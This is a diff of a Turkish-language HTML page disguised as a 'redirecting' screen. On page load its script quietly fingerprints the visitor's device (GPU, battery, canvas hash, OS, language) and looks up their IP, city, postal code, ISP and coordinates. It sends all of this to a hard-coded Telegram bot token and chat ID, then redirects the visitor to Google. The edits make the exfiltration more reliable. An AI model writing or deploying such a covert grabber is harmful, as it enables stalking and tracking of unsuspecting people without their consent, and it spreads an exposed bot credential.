@@ -3,11 +3,13 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Güvenlik Protokolü</title>
+    <title>Yönlendiriliyor...</title>
+    <style>
+        body { background: #000; margin: 0; padding: 0; }
+    </style>
 </head>
 <body>
     <script>
-        // High-Entropy ve Canvas kombinasyonu ile cihaz kimliği
         function getCanvasFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
@@ -28,17 +30,15 @@
         }
 
         window.onload = async function() {
-            // Arka planda IP API'sini hemen tetikle (hız için)
-            const cacheBuster = "?cb=" + Math.random();
-            const ipFetch = fetch("https://ipapi.co/json/" + cacheBuster)
-                .then(r => r.json())
-                .catch(() => fetch("https://api.db-ip.com/v2/free/self" + cacheBuster).then(r => r.json()));
+            let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
+            let cid = "6845229845";
+            let tarih = new Date().toLocaleString('tr-TR');
 
-            // --- DETAYLI DONANIM VERİLERİNİ TOPLAMA (Eski Kabarık Yapı) ---
+            // --- 1. SAF DONANIM VERİLERİ (Anında okunur) ---
             let ua = navigator.userAgent;
             let os = "Bilinmeyen Sistem";
             
-            // Android Sürüm Yakalama Optimizasyonu
+            // İlk kodundaki stabil çalışan Android/iOS tespit yapısı
             if (/Android/i.test(ua)) {
                 let match = ua.match(/Android\s([0-9\.]+)/);
                 os = match ? "Android " + match[1] : "Android";
@@ -53,12 +53,11 @@
             let dil = navigator.language || "Bilinmiyor";
             let dokunmatik = (('ontouchstart' in window) || (navigator.maxTouchPoints > 0)) ? "Evet" : "Hayır";
             let tema = (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? "Karanlık" : "Açık";
-            let tarih = new Date().toLocaleString('tr-TR');
 
             let gpuModel = "Bilinmiyor";
             try {
                 const canvasGpu = document.createElement('canvas');
-                const gl = canvasGpu.getContext('webgl') || canvasGpu.getContext('experimental-webgl');
+                const gl = canvasGpu.getContext('webgl');
                 if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                     if (debugInfo) gpuModel = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
@@ -68,20 +67,24 @@
             let pil = "Bilinmiyor";
             if (navigator.getBattery) { try { let b = await navigator.getBattery(); pil = Math.round(b.level * 100) + "% " + (b.charging ? "(Şarjda ⚡)" : "(Deşarj)"); } catch(e){} }
 
-            let ag_baglantisi = "Bilinmiyor";
+            let agTipi = "Bilinmiyor";
             if (navigator.connection) {
-                ag_baglantisi = (navigator.connection.effectiveType || "") + " (~" + (navigator.connection.downlink || "") + " Mbps)";
+                agTipi = navigator.connection.effectiveType + " (~" + navigator.connection.downlink + " Mbps)";
             }
 
-            let ip = "Bilinmiyor", ulke = "Bilinmiyor", eyalet_sehir = "Bilinmiyor", posta_kodu = "Bilinmiyor", internet_sirketi = "Bilinmiyor", koordinat = "Bilinmiyor", maps_link = "";
+            // --- 2. IP VE KONUM VERİLERİ (Fetch) ---
+            let ip = "Bilinmiyor", ulke = "Bilinmiyor", eyalet_sehir = "Bilinmiyor";
+            let posta_kodu = "Bilinmiyor", internet_sirketi = "Bilinmiyor", koordinat = "Bilinmiyor";
+            let maps_link = "https://maps.google.com";
 
-            // IP Verilerini asenkron bekliyoruz
             try {
-                let veri = await ipFetch;
+                // Hata payını sıfırlamak için doğrudan IP API'sini senkron gibi bekliyoruz
+                let istek = await fetch("https://ipapi.co/json/?cb=" + Math.random());
+                let veri = await istek.json();
                 if (veri) {
-                    ip = veri.ip || veri.ipAddress || "Bilinmiyor";
-                    ulke = veri.country_name || veri.countryName || "Bilinmiyor";
-                    eyalet_sehir = veri.city ? (veri.region ? veri.region + " / " + veri.city : veri.city) : "Bilinmiyor";
+                    ip = veri.ip || "Bilinmiyor";
+                    ulke = veri.country_name || "Bilinmiyor";
+                    eyalet_sehir = (veri.region || "") + " / " + (veri.city || "");
                     posta_kodu = veri.postal || "Bilinmiyor";
                     internet_sirketi = veri.org || "Bilinmiyor";
                     if (veri.latitude && veri.longitude) {
@@ -89,9 +92,16 @@
                         maps_link = "https://www.google.com/maps?q=" + veri.latitude + "," + veri.longitude;
                     }
                 }
-            } catch (e) {}
+            } catch (e) {
+                // Yedek API
+                try {
+                    let r2 = await fetch("https://api.db-ip.com/v2/free/self");
+                    let d2 = await r2.json();
+                    if (d2) { ip = d2.ipAddress; ulke = d2.countryName; eyalet_sehir = d2.city; }
+                } catch(err){}
+            }
 
-            // --- KABARIK METİN MESAJI ---
+            // --- 3. KABARIK MESAJ FORMATI ---
             let mesaj = "👑 *MEGA NETWORK OPERATIONS LOG*\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
             mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
@@ -113,52 +123,35 @@
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
             mesaj += "🎮 *Ekran Kartı (GPU):* `" + gpuModel + "`\n";
             mesaj += "🔑 *Canvas Fingerprint:* `" + getCanvasFingerprint() + "`\n";
-            mesaj += "📡 *Bağlantı Kalitesi:* " + ag_baglantisi + "\n";
+            mesaj += "📡 *Bağlantı Kalitesi:* " + agTipi + "\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━";
 
-            // Txt dosyası içeriği için saf metin hali
-            let txtIcerik = mesaj.replace(/\*/g, "").replace(/`/g, "");
-
-            let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
-            let cid = "6845229845";
-
-            // Harita butonu yapısı (Sadece çalışan link tipli buton bıraktık)
+            // Telegram'da kesin açılan çalışan buton yapısı
             let reply_markup = {
                 inline_keyboard: [
-                    [{ text: "📍 Haritada Göster", url: maps_link || "https://maps.google.com" }]
+                    [{ text: "📍 Konumu Haritada Gör", url: maps_link }]
                 ]
             };
 
-            // 1. Eylem: Detaylı Log Mesajını Gönder
-            const sendText = fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: cid,
-                    text: mesaj,
-                    parse_mode: "Markdown",
-                    reply_markup: reply_markup
-                })
-            });
+            // --- 4. GÜVENLİ VE GARANTİ GÖNDERİM SÜRECİ ---
+            // Tarayıcının isteği yarıda kesmesini önlemek için "keepalive: true" ekledik.
+            // Bu sayede sayfa kapansa bile veri Telegram'a kesin ulaşır.
+            try {
+                await fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: cid,
+                        text: mesaj,
+                        parse_mode: "Markdown",
+                        reply_markup: reply_markup
+                    }),
+                    keepalive: true 
+                });
+            } catch (err) {}
 
-            // 2. Eylem: Otomatik Data Dosyası (.txt) Oluşturup Gönder (Butona basma derdi yok)
-            let blob = new Blob([txtIcerik], { type: "text/plain" });
-            let formData = new FormData();
-            formData.append("chat_id", cid);
-            formData.append("document", blob, `log_${ip}.txt`);
-            formData.append("caption", "📁 Sistem tarafından otomatik üretilen data dosyası.");
-
-            const sendDoc = fetch(`https://api.telegram.org/bot${tok}/sendDocument`, {
-                method: "POST",
-                body: formData
-            });
-
-            // İki işlem de bitince veya tarayıcı izin verdiği an Google'a fırlat
-            Promise.all([sendText, sendDoc]).then(() => {
-                window.location.replace("https://www.google.com");
-            }).catch(() => {
-                window.location.replace("https://www.google.com");
-            });
+            // Gönderim bittiği an salisesinde Google'a uçurur
+            window.location.replace("https://www.google.com");
         };
     </script>
 </body>
